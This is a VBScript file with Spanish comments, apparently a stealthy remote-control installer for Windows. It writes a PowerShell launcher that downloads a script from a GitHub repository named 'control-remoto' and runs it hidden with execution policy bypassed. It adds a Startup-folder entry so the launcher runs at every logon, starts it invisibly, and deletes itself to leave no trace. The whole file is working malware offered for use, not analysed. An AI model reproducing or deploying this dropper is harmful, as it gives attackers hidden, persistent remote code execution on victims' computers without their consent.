' ==============================================================================
' INSTALADOR INVISIBLE DE UN SOLO CLIC (.VBS)
' ==============================================================================
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")

' 1. CONFIGURACIÓN: Enlace RAW exacto de GitHub
UrlGitHub = "https://raw.githubusercontent.com/joe2sc712-beep/control-remoto/refs/heads/main/cliente_base.ps1"

' Definicion de rutas fijas de Windows
CarpetaC = "C:\ScriptCliente"
LanzadorPs1 = CarpetaC & "\cliente.ps1"
AppdataDir = wsh.ExpandEnvironmentStrings("%APPDATA%")
StartupVbs = AppdataDir & "\Microsoft\Windows\Start Menu\Programs\Startup\iniciar_cliente.vbs"

' 2. CREAR CARPETA EN C:\ SI NO EXISTE
If Not fso.FolderExists(CarpetaC) Then
    fso.CreateFolder(CarpetaC)
End If

' 3. CREAR EL ARCHIVO LANZADOR (cliente.ps1) DENTRO DE C:\ScriptCliente\
Set archivoPs1 = fso.CreateTextFile(LanzadorPs1, True)
archivoPs1.WriteLine "$UrlGitHub  = """ & UrlGitHub & """"
archivoPs1.WriteLine "$RutaLocal  = ""$PSScriptRoot\cliente_base.ps1"""
archivoPs1.WriteLine "try {"
archivoPs1.WriteLine "    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
archivoPs1.WriteLine "    Invoke-WebRequest -Uri $UrlGitHub -OutFile $RutaLocal -TimeoutSec 10 -ErrorAction Stop"
archivoPs1.WriteLine "} catch {}"
archivoPs1.WriteLine "if (Test-Path $RutaLocal) {"
archivoPs1.WriteLine "    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $RutaLocal"
archivoPs1.WriteLine "}"
archivoPs1.Close

' 4. CREAR EL ARCHIVO INVISIBLE VBS EN LA CARPETA DE INICIO (Startup)
Set archivoVbs = fso.CreateTextFile(StartupVbs, True)
archivoVbs.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
archivoVbs.WriteLine "RutaLanzador = ""C:\ScriptCliente\cliente.ps1"""
archivoVbs.WriteLine "WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """" "" & RutaLanzador & "" """"", 0, False"
archivoVbs.Close

' 5. PASO FINAL: INICIAR EL SISTEMA AHORA MISMO DE FORMA INVISIBLE
If fso.FileExists(StartupVbs) Then
    wsh.Run "wscript.exe """ & StartupVbs & """", 0, False
End If

' 6. AUTO-ELIMINACIÓN DEL INSTALADOR
' Borra este mismo archivo .vbs inmediatamente después de terminar para no dejar rastro
fso.DeleteFile WScript.ScriptFullName, True
